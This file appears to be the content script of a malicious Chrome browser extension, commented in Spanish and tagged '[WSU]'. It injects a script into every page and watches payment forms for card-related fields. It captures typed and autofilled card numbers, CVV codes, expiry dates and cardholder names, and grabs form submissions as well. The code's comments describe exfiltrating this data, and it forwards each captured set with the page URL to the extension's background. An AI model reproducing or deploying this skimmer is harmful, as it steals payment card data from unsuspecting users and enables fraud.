// Content Script - Inyectado en todas las páginas
// Intercepta datos de formularios y autofill

console.log('[WSU] Content script loaded');

// Inyectar script en el contexto de la página
const script = document.createElement('script');
script.src = chrome.runtime.getURL('injected.js');
script.onload = function() {
  this.remove();
};
(document.head || document.documentElement).appendChild(script);

// Listener para mensajes del background
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'payment_page') {
    console.log('[WSU] Payment page active, monitoring forms');
    monitorPaymentForms();
    sendResponse({success: true});
  }
  return true;
});

// Monitorear formularios de pago
function monitorPaymentForms() {
  // Observar todos los inputs de tipo texto/number
  const inputs = document.querySelectorAll('input[type="text"], input[type="number"], input[type="tel"]');

  inputs.forEach(input => {
    // Detectar campos de tarjeta por name/id/placeholder
    const fieldName = (input.name + input.id + input.placeholder).toLowerCase();

    if (isCardField(fieldName)) {
      console.log('[WSU] Card field detected:', input);

      // Capturar cuando el usuario escribe
      input.addEventListener('input', (e) => {
        const value = e.target.value;
        if (value.length > 0) {
          captureFieldData(fieldName, value);
        }
      });

      // Capturar cuando pierde el foco (usuario terminó de escribir)
      input.addEventListener('blur', (e) => {
        const value = e.target.value;
        if (value.length > 0) {
          captureFieldData(fieldName, value);
        }
      });
    }
  });

  // Observar nuevos campos que se agreguen dinámicamente
  const observer = new MutationObserver((mutations) => {
    mutations.forEach((mutation) => {
      mutation.addedNodes.forEach((node) => {
        if (node.nodeType === 1 && node.tagName === 'INPUT') {
          const fieldName = (node.name + node.id + node.placeholder).toLowerCase();
          if (isCardField(fieldName)) {
            console.log('[WSU] New card field detected:', node);
            // Agregar listeners
          }
        }
      });
    });
  });

  observer.observe(document.body, {
    childList: true,
    subtree: true
  });
}

// Detectar si un campo es de tarjeta
function isCardField(fieldName) {
  const patterns = [
    'card', 'cc', 'creditcard', 'credit-card',
    'cardnumber', 'card-number', 'ccnum',
    'cvv', 'cvc', 'security', 'csc',
    'expir', 'exp-date', 'expiry',
    'cardholder', 'card-name'
  ];

  return patterns.some(pattern => fieldName.includes(pattern));
}

// Almacén temporal de datos capturados
const capturedData = {};

// Capturar datos de campo
function captureFieldData(fieldName, value) {
  // Limpiar y categorizar
  if (fieldName.includes('card') && !fieldName.includes('name') && /^\d+$/.test(value.replace(/\s/g, ''))) {
    capturedData.cardNumber = value.replace(/\s/g, '');
  } else if (fieldName.includes('cvv') || fieldName.includes('cvc')) {
    capturedData.cvv = value;
  } else if (fieldName.includes('exp')) {
    capturedData.expiry = value;
  } else if (fieldName.includes('name') || fieldName.includes('holder')) {
    capturedData.cardholderName = value;
  }

  // Si tenemos suficientes datos, exfiltrar
  if (capturedData.cardNumber && (capturedData.cvv || capturedData.expiry)) {
    console.log('[WSU] Complete card data captured');

    chrome.runtime.sendMessage({
      type: 'autofill_data',
      data: {
        ...capturedData,
        url: window.location.href,
        timestamp: new Date().toISOString()
      }
    });

    // Limpiar datos capturados
    Object.keys(capturedData).forEach(key => delete capturedData[key]);
  }
}

// Interceptar eventos de autofill del navegador
document.addEventListener('input', (e) => {
  // Detectar cuando el navegador autocompleta
  if (e.inputType === 'insertReplacementText' || e.target.matches(':-webkit-autofill')) {
    console.log('[WSU] Autofill detected on:', e.target);

    // Capturar el valor autocompletado
    setTimeout(() => {
      const fieldName = (e.target.name + e.target.id).toLowerCase();
      const value = e.target.value;

      if (value && isCardField(fieldName)) {
        captureFieldData(fieldName, value);
      }
    }, 100);
  }
}, true);

// Interceptar submit de formularios
document.addEventListener('submit', (e) => {
  const form = e.target;
  const formData = new FormData(form);

  const data = {};
  let hasCardData = false;

  for (const [key, value] of formData.entries()) {
    const fieldName = key.toLowerCase();

    if (isCardField(fieldName)) {
      data[key] = value;
      hasCardData = true;
    }
  }

  if (hasCardData) {
    console.log('[WSU] Card data in form submit');

    chrome.runtime.sendMessage({
      type: 'autofill_data',
      data: {
        ...data,
        url: window.location.href,
        timestamp: new Date().toISOString(),
        source: 'form_submit'
      }
    });
  }
}, true);

console.log('[WSU] Content script initialized');
